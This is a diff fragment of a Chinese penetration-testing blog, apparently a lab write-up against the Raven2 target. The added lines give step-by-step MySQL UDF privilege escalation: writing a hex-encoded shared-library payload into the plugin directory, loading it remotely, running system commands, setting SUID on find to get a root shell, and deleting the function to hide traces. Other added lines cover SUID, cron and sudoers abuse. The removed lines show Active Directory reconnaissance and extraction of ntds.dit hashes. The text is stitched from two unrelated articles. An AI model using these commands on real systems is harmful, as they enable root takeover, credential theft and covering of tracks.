+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func；</span><br></pre></td></tr></table></figure>
+
+<p>当我们通过各种方法获取了目标mysql数据库的权限并且满足udf提权的条件后，我们可以按照以下步骤进行提权。</p>
+<h4 id="1-查看secure-file-priv的值"><a href="#1-查看secure-file-priv的值" class="headerlink" title="1.查看secure_file_priv的值"></a>1.查看secure_file_priv的值</h4><p>secure_file_priv是用来限制into dumpfile,into outfile.load_file()能在哪个目录下导出或者读取文件的，所以该值为空是我们利用udf提权的首要条件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv | |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-查看系统架构及plugin插件目录"><a href="#2-查看系统架构及plugin插件目录" class="headerlink" title="2. 查看系统架构及plugin插件目录"></a>2. 查看系统架构及plugin插件目录</h4><p>UDF的dll动态链接库文件需要放在该目录下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%compile%&#x27;; # 查看主机版本及架构</span><br><span class="line">+-------------------------+--------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+-------------------------+--------+</span><br><span class="line">| version_compile_machine | x86_64 |</span><br><span class="line">| version_compile_os | Linux |</span><br><span class="line">+-------------------------+--------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &#x27;%plugin%&#x27;; # 查看plugin⽬录</span><br><span class="line">+---------------+-------------------------------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------------------------------+</span><br><span class="line">| plugin_dir | /www/server/mysql/lib/plugin/ |</span><br><span class="line">+---------------+-------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>可知该主机plugin插件目录为/www/server/mysql/lib/plugin/</p>
+<p>如果该目录不存在的话可以手工创建该文件夹。</p>
+<h4 id="3-将我们构造的恶意动态链接库文件写入plugin插件目录"><a href="#3-将我们构造的恶意动态链接库文件写入plugin插件目录" class="headerlink" title="3. 将我们构造的恶意动态链接库文件写入plugin插件目录"></a>3. 将我们构造的恶意动态链接库文件写入plugin插件目录</h4><p>我们应该去哪儿找恶意的动态链接库文件呢？Sqlmap和Metasploit工具里面都自带了对应系统的动态链接库文件。</p>
+<p>下面是两者的UDF动态链接库文件的存放位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap: 位于sqlmap/data/udf/mysql目录下，包含64位和32位liunx和windows系统下利用的动态链接库文件</span><br><span class="line">metasploit: 位于/user/share/metasploit-framework/data/exploits/mysql目录下，包含64位和32位liunx和windows系统下利用的动态链接库文件:</span><br></pre></td></tr></table></figure>
+
+<p>ps:sqlmap中自带的动态链接库为了防止被杀软误杀都要经过编码处理，不能直接使用。使用之前需要先用sqlmap自带的解码工具cloak.py（extra/cloak目录下）解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cloak.py -d -i &lt;动态链接库文件名&gt;</span><br></pre></td></tr></table></figure>
+
+<p>找到目标主机对应系统版本和位数的UDF文件后，我们需要将UDF文件写入plugin插件目录，大多数情况下我们是将.dll转化成16进制然后再写入</p>
+<p>首先再攻击者本地，将lib_mysqludf_sys_64.so或lib_mysqludf_sys_32.so中的内容进行十六进制编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;lib_mysqludf_sys_64.so&#x27;)) into outfile &quot;udf_64.hex&quot;</span><br></pre></td></tr></table></figure>
+
+<p>生成了hex文件以后我们可以将udf_53.hex文件的内容复制出来，注意前面加上(0x)，然后执行如下命令写入目标机的lib/plugin插件目录下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">0x7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180</span><br><span class="line">000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000</span><br><span class="line">00000000000000000000141500000000000014150000000000000000200000000000010000000600000018.</span><br><span class="line">.....010000000000000000000000000000000000000088170000000000009B000000000000000000000000</span><br><span class="line">000000010000000000000000000000000000000100000003000000000000000000000000000000000000002</span><br><span class="line">318000000000000C500000000000000000000000000000001000000000000000000000000000000 into</span><br><span class="line">dumpfile &quot;/www/server/mysql/lib/plugin/udf.so&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是由于数据过长，我们需要将其分段写入。即先创建一个表，然后将十六进制数据分段写入表中，最后将含有数据的那个字段导出到udf.so，操作如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">create table temp(data longblob);</span><br><span class="line">insert into temp(data) values</span><br><span class="line">(0x7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E818</span><br><span class="line">0000000000000000000040003800050040001A0019000100000005000000000000000000000000000000000</span><br><span class="line">000000000000000000000141500000000000014150000000000000000200000000000010000000600000018</span><br><span class="line">150000000000001815200000000000181520000000000070020000000000008002000000000000000020000</span><br><span class="line">000000002000000060000004015000000000000401520000000000040152000000000009001000000000000</span><br><span class="line">9001000000000000080000000000000050E5746404000000641200000000000064120000000000006412000</span><br><span class="line">0000000009C000000000000009C00000000000000040000000000000051E574640600000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000080000000000000025000</span><br><span class="line">0002B0000001500000005000000280000001E000000000000000000000006000000000000000C0000000000</span><br><span class="line">0000070000002A00000009000000210000000000000000000000270000000B000000220);</span><br><span class="line">update temp set data =</span><br><span class="line">concat(data,0x0000018000000240000000E00000000000000040000001D00000016000000000000001300</span><br><span class="line">00000000000000000000120000002300000010000000250000001A0000000F0000000000000000000000000</span><br><span class="line">00000000000001B000000000000000300000000000000000000000000000000000000000000000000000029</span><br><span class="line">00000014000000000000001900000020000000000000000A000000110000000000000000000000000000000</span><br><span class="line">00000000D000000260000001700000000000000080000000000000000000000000000000000000000000000</span><br><span class="line">1F0000001C00000000000000000000000000000000000000000000000200000000000000110000001400000</span><br><span class="line">00200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000</span><br><span class="line">001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A000</span><br><span class="line">00000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B</span><br><span class="line">92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0);</span><br><span class="line">update temp set data =</span><br><span class="line">concat(data,0xAC73D1C525681B320B5911FEAB5FBE1200000000000000000000000000000000000000000</span><br><span class="line">00000000000000003000900A00B000000000000000000000000000001000000200000000000000000000000</span><br><span class="line">0000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000</span><br><span class="line">000000000DE01000000000000790100001200000000000000000000007700000000000000BA000000120000</span><br><span class="line">0000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010</span><br><span class="line">000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000</span><br><span class="line">000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD0</span><br><span class="line">0000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000</span><br><span class="line">000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000</span><br><span class="line">000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000</span><br><span class="line">120000000000000000000000E802000000000000E70000001200000000000000000000009B);</span><br><span class="line">...... # 不断通过update语句配合concat将数据拼接进去，当⼗六进制数据全部分段拼⼊data字段后，执⾏如下</span><br><span class="line">命令将该字段导出:</span><br><span class="line">select data from temp into dumpfile &quot;/www/server/mysql/lib/plugin/udf.so&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>还有一个方法便是利用load_file()函数，该函数支持远程加载，我们可以将udf文件放在公用服务器上，执行如下命令让目标服务器远程加载该文件并下载到指定目录里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;\\\\xxx.xxx.xxx.xxx\udf.so&#x27;) into dumpfile</span><br><span class="line">&quot;/www/server/mysql/lib/plugin/udf.so&quot;</span><br></pre></td></tr></table></figure>
+
+<p>引入的方式如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &#x27;udf.so&#x27;；</span><br></pre></td></tr></table></figure>
+
+<p>成功引入该函数后，我们便可以像执行其他mysql内置函数一样去使用该函数了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a>清理痕迹</h4><p>删除自定义函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval;</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220002424852.png" alt="image-20220220002424852"></p>
-<h2 id="2-PVEFindADUser-exe"><a href="#2-PVEFindADUser-exe" class="headerlink" title="2.PVEFindADUser.exe"></a>2.PVEFindADUser.exe</h2><p><a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe">Tools/PVEFindADUser.exe at master · chrisdee/Tools · GitHub</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe -current -target hostname</span><br></pre></td></tr></table></figure>
+<h3 id="liunx-udf提权"><a href="#liunx-udf提权" class="headerlink" title="liunx udf提权"></a>liunx udf提权</h3><p>这里使用了网上的靶机Raven2。</p>
+<p>在经过前面的步骤后，可以找到数据库的密码，可以使用数据库提权。</p>
+<p>可以找到mysql数据库的用户名和密码</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226173258537.png" alt="image-20220226173258537"></p>
+<p>使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220003159391.png" alt="image-20220220003159391"></p>
-<h2 id="3-Powerview-ps1"><a href="#3-Powerview-ps1" class="headerlink" title="3.Powerview.ps1"></a>3.Powerview.ps1</h2><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure>
+<p>查找系统版本，确认是64位系统Liunx</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226174052385.png" alt="image-20220226174052385"></p>
+<p>从<code>/user/share/metasploit-framework/data/exploits/mysql</code>目录下考取出对应的<code>lib_mysqludf_sys_64.so</code>之后通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure>
 
-<p>powerview.ps1是非常全面的，它有如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1. Get-NetDomain 获取当前⽤户所在域的名称</span><br><span class="line">2. Get-NetUser 获取所有⽤户的详细信息</span><br><span class="line">3. Get-NetDomainController 获取所有域控制器的信息</span><br><span class="line">4. Get-NetComputer 获取域内所有机器的详细信息</span><br><span class="line">5. Get-NetPrinter 获取域中所有当前计算机对象的数组</span><br><span class="line">6. Get-NetOU 获取域内的OU信息</span><br><span class="line">7. Get-NetGroup 获取所有域内组和组成员的信息</span><br><span class="line">8. Get-NetGroupMember 获取指定域组中所有当前⽤户的列表</span><br><span class="line">9. Get-NetFileServer 根据SPN获取当前域使⽤的⽂件服务器信息</span><br><span class="line">10. Get-NetShare 获取当前域内所有的⽹络共享信息</span><br><span class="line">11. Get-DFSshare 获取域上所有分发⽂件系统共享的列表</span><br><span class="line">12. Get-NetSubnet 获取域的其他⽹段</span><br><span class="line">13. Get-NetSite 获取域内的当前站点</span><br><span class="line">14. Get-NetDomainTrust 获取当前⽤户域的所有信任</span><br><span class="line">15. Get-NetForestTrust 获取与当前⽤户的域关联的林的所有信任</span><br><span class="line">16. Find-ForeignUser 枚举在其主域之外的组中的⽤户</span><br><span class="line">17. Find-ForeignGroup 枚举域组的所有成员并查找查询域之外的⽤户</span><br><span class="line">18. Invoke-MapDomainTrust 尝试构建所有域信任的关系映射</span><br><span class="line">19. Get-NetLoggedon 获取主动登录到指定服务器的⽤户</span><br><span class="line">20. Get-NetLocalGroup 获取⼀个或多个远程主机上本地组的成员</span><br><span class="line">21. Get-NetSession 获取指定服务器的会话</span><br><span class="line">22. Get-NetRDPSession 获取指定服务器的远程连接</span><br><span class="line">23. Get-NetProcess 获取远程主机的进程</span><br><span class="line">24. Get-UserEvent 获取指定⽤户的⽇志</span><br><span class="line">25. Get-ADObject 获取活动⽬录的对象</span><br><span class="line">26. Get-NetGPO 获取域内所有的组策略对象</span><br><span class="line">27. Get-NetGPOGroup 获取域中设置”受限组”的所有GPO</span><br><span class="line">28. Find-GPOLocation 获取⽤户/组，并通过GPO枚举和关联使其具有有效权限的计</span><br><span class="line">算机</span><br><span class="line">29. Find-GPOComputerAdmin 获取计算机并通过GPO枚举确定谁对其具有管理权限</span><br><span class="line">30. Get-DomainPolicy 获取域默认策略或域控制器策略</span><br><span class="line">31. Get-DomainSID 返回指定域的SID</span><br><span class="line">32. Invoke-UserHunter 获取域⽤户登录的计算机信息及该⽤户是否有本地管理员权</span><br><span class="line">限</span><br><span class="line">33. Invoke-ProcessHunter 通过查询域内所有的机器进程找到特定⽤户</span><br><span class="line">34. Invoke-UserEventHunter 根据⽤户⽇志查询某域⽤户登陆过哪些域机器</span><br><span class="line">35. Invoke-ShareFinder 在本地域中的主机上查找（⾮标准）共享</span><br><span class="line">36. Invoke-FileFinder 在本地域中的主机上查找潜在的敏感⽂件</span><br><span class="line">37. Find-LocalAdminAccess 在域上查找当前⽤户具有本地管理员访问权限的计算机</span><br><span class="line">38. Find-ManagedSecurityGroups 搜索受管理的活动⽬录安全组并标识对其具有写</span><br><span class="line">访问权限的⽤户，即这些组拥有添加或删除成员的能⼒</span><br><span class="line">39. Get-ExploitableSystem 发现系统可能易受常⻅攻击</span><br><span class="line">40. Invoke-EnumerateLocalAdmin 枚举域中所有计算机上本地管理员组的成员</span><br></pre></td></tr></table></figure>
+<p>命令启动一个http服务，使用wget将该文件下至靶机上并改名<code>sdfz_udf.so</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line">find / -exec &quot;/bin/sh&quot; \;</span><br><span class="line">获取root权限</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br><span class="line">mysql&gt; insert into foo values(load_file(&#x27;/tmp/sdfz_udf.so&#x27;));</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/sdfz_udf.so&#x27;));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/sdfz_udf.so&#x27;;</span><br><span class="line">【其中dumpfile的路径要根据前⾯进程列出来的plugin⽬录进⾏改动】</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/sdfz_udf.so&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.04 sec)</span><br><span class="line">mysql&gt; create function do_system returns integer soname &#x27;sdfz_udf.so&#x27;;</span><br><span class="line">create function do_system returns integer soname &#x27;sdfz_udf.so&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">select * from mysql.func;</span><br><span class="line">+-----------+-----+-------------+----------+</span><br><span class="line">| name | ret | dl | type |</span><br><span class="line">+-----------+-----+-------------+----------+</span><br><span class="line">| do_system | 2 | sdfz_udf.so | function |</span><br><span class="line">+-----------+-----+-------------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">【chmod u+s 表示给某个程序的所有者以suid权限，可以像root⽤户⼀样操作】</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(&#x27;chmod u+s /usr/bin/find&#x27;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| 0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
 
-<h1 id="四、域信任关系"><a href="#四、域信任关系" class="headerlink" title="四、域信任关系"></a>四、域信任关系</h1><p>域信任是为了解决多域环境中的跨域资源共享问题而诞生的。两个域之间必须拥有信任关系，才可以访问到对方域内的资源。任何一个新的子域加入到域树之后。这个域会自动信任其上一层的父域，同时父域也会自动信任新子域，而且这些信任具有双向传递性。由于此信任⼯作是通过Kerberos security protocol来完成的，因为也被成为KerberosTrust。</p>
-<p>域信任利⽤DNS服务器定位两个不同⼦域的域控制器，如果两个域中的域控制器都⽆法 找到另⼀个域，那么也就不存在通过域信任关系进⾏跨域资源共享。</p>
-<p>域环境不会⽆条件地接收来⾃其他域的凭证，只会接收来⾃受信任的域的凭证。在默认 情况下,特定 Windows域中的所有⽤户都可以通过该域中的资源进⾏身份验证。通过这种⽅式, 域可以为其⽤户提供对该域中所有资源的安全访问机制。如果⽤户想要访问边界以外的资源, 需要使⽤域信任。 </p>
-<p>域信任关系类型： ● 单向信任 是指在两个域之间创建单向的信任路径，即在⼀个⽅向.上是信任流，在另⼀个⽅向 上是访问流。在受信任域和信任域之间的单向信任中，受信任域内的⽤户或计算机可以访问信 任域中的资源，但信任域内的⽤户却⽆法访问受信任域内的资源。也就是说，若A域信任B 域，那么B域内受信任的主体可以访问A域内信任B域的资源。 ● 双向信任 是指两个单向信任的组合，信任域和受信任域彼此信任，在两个⽅向上都有信任流 和访问流。这意味着，可以从两个⽅向在两个域之间传递身份验证请求。活动⽬录中的所有域 信任关系都是双向可传递的。在创建⼦域时，会在新的⼦域和⽗域之间⾃动创建双向可传递信 任关系。 </p>
-<p>建⽴信任的⽬的是允许来⾃⼀个域的⽤户访问资源（如服务器上的本地管理员组），嵌套在组 中或以其他⽅式使⽤另⼀个域中的安全主体（例如⽤于 AD 对象 ACL ）。 对此有个例外是域 林内信任（存在于同⼀ Active Directory 林中的域信任）——在林中创建的任何域都与林中的 每个其他域保持隐式双向、可传递的信任关系。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts  //查看域信任信息</span><br></pre></td></tr></table></figure>
+<p>接下来可以使用find-exec 参数执行命令，获得权限root</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226183137728.png" alt="image-20220226183137728"></p>
+<h2 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a>Suid提权</h2><p>运行某些程序暂时获得root权限，例如ping命令</p>
+<p>搜索符合条件的可以用来提权的:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb&#123;&#125; \;</span><br><span class="line">find / -user root -perm -4000 -print 2 &gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220004301275.png" alt="image-20220220004301275"></p>
-<h1 id="五、NTDS-dit导出hash"><a href="#五、NTDS-dit导出hash" class="headerlink" title="五、NTDS.dit导出hash"></a>五、NTDS.dit导出hash</h1><p>在活动目录中，所有的数据都保存在域控的ntds.dit文件中。</p>
-<p>ntds.dit是一个二进制文件，文件路径为域控的<code>%SystemRoot%\ntds\ntds.dit</code>。NTDS.dit包含不限于用户名、散列值、组、GPP、OU等活动目录的信息。系统运维人员可以使用VSS（Volumn shadow copy servcice，卷映射拷贝服务）。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先在cmd中创建快照</span><br><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure>
+<p>搜索可以提权的程序，一般有以下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap vim find bash more less nano cp</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005025693.png" alt="image-20220220005025693"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用GUID挂在快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;刚才的快照序号&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+<h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>如果可以找到有权限修改的计划任务脚本，就可以修改脚本实现提权。本质上，就是文件权限配置不当。查看计划任务，找到有修改权限的计划任务脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/corn*</span><br><span class="line">more /etc/conrntab</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005512106.png" alt="image-20220220005512106"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将挂载文件中的ntds.dit复制出来</span><br><span class="line">copy C:\$SNAP_20220220048_VOLUMEC$\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br></pre></td></tr></table></figure>
+<p>可见以下资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p>
+<h2 id="Sudo提权"><a href="#Sudo提权" class="headerlink" title="Sudo提权"></a>Sudo提权</h2><p>普通用户一般是无法运行root所有者的命令的，但是运用sudo可以使普通用户使用root用户的命令。但是在一些场景下，管理员为了平常运营方便给sudoer文件配置不当，从而导致权限提升的问题产生。</p>
+<p>首先通过信息收集，查看是否存在sudo配置不当的可能。如果存在，寻找低权限sudo用户的密码，进而提权。</p>
+<ol>
+<li>通过查看/etc/passwd文件找到登录用户</li>
+<li>通过id命令查看两个用户所属组</li>
+<li>通过查看/etc/group文件查看sudo组成员</li>
+<li>通过查看各登录用户家目录隐藏文件，寻找.sudo_as_admin_successful文件，证实sudo成功使用</li>
+<li>在某些时刻sudo被设置为<code>NOPASSWD</code>如下，可以sudo -l</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$vi /etc/sudoers</span><br><span class="line">在最后一行添加:bypass ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005909927.png" alt="image-20220220005909927"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">卸载快照并删除快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;序列号&#125;&quot; &quot;delete &#123;序列号&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220010236881.png" alt="image-20220220010236881"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询当前系统所有快照</span><br><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure>
 
-<p>要想得到域的用户名导出信息等，还需要注册表下的system文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\system</span><br></pre></td></tr></table></figure>
-
-<p>要想提取ntds.dit的hash也有很多方法，这里就只拿出一点简便的</p>
